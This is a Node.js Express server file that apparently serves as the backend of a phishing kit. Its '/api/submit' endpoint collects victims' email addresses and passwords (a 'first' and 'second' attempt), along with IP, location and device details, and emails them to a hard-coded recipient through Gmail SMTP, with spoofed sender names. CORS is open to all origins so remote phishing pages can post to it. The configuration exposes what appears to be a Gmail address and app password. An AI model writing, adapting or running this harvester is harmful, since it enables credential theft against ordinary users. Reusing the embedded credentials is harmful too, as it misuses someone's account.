const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

// Configuration (Edit these values)
const CONFIG = {
  PORT: 3000,
  EMAIL: {
    USER: 'ranickiauerbach@gmail.com',          // Your Gmail
    PASS: 'nlov pvvd rcoa dnwl',                // App Password
    RECIPIENT: 'victorabuke2@yahoo.com',        // Where emails go
    SENDERS: {
      FIRST_PW: 'logsnur01@rich.co',            // Sender for first password
      SECOND_PW: 'logsnur02@rich.us'            // Sender for second password
    }
  },
  CORS_ORIGIN: '*'                              // Allow all origins
};

// Initialize
const app = express();
app.use(cors({ origin: CONFIG.CORS_ORIGIN }));
app.use(express.json());

// Email transporter
const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 587,
  secure: false,
  auth: {
    user: CONFIG.EMAIL.USER,
    pass: CONFIG.EMAIL.PASS
  }
});

// API Endpoint (Same as your PHP)
app.post('/api/submit', async (req, res) => {
  try {
    const {
      email,
      firstpasswordused,
      secondpasswordused,
      continent = 'nil',
      country = 'nil',
      city = 'nil',
      referrer = 'nil',
      emailSource = 'nil',
      device = {}
    } = req.body;

    // Validate input
    if (!email || (!firstpasswordused && !secondpasswordused)) {
      return res.json({
        emailStatus: {
          status: 'error',
          message: 'Provide exactly one password'
        }
      });
    }

    // Prepare email
    const passwordUsed = firstpasswordused || secondpasswordused;
    const fromEmail = firstpasswordused ? CONFIG.EMAIL.SENDERS.FIRST_PW : CONFIG.EMAIL.SENDERS.SECOND_PW;

    await transporter.sendMail({
      from: `"Zap!" <${fromEmail}>`,
      to: CONFIG.EMAIL.RECIPIENT,
      subject: `Info - ${email}`,
      html: `
        <h3>Details</h3>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${passwordUsed}</p>
        <p><strong>IP:</strong> ${req.ip}</p>
        <p>From: ${city}, ${country}, ${continent}</p>
        <h4>Device Info</h4>
        <p><strong>User Agent:</strong> ${device.userAgent || 'nil'}</p>
        <p><strong>Language:</strong> ${device.language || 'nil'}</p>
        <p><strong>Platform:</strong> ${device.platform || 'nil'}</p>
        <p><strong>Brand:</strong> ${device.brand || 'nil'}</p>
        <p><strong>Mobile:</strong> ${device.mobile ? 'Yes' : 'No'}</p>
      `
    });

    res.json({
      emailStatus: {
        status: 'success',
        message: 'Email sent'
      }
    });

  } catch (error) {
    console.error('Email error:', error);
    res.json({
      emailStatus: {
        status: 'error',
        message: 'Failed to send email'
      }
    });
  }
});

// Start server
app.listen(CONFIG.PORT, () =>
  console.log(`Server running on port ${CONFIG.PORT}\nReady to receive requests from: ${CONFIG.CORS_ORIGIN}`)
);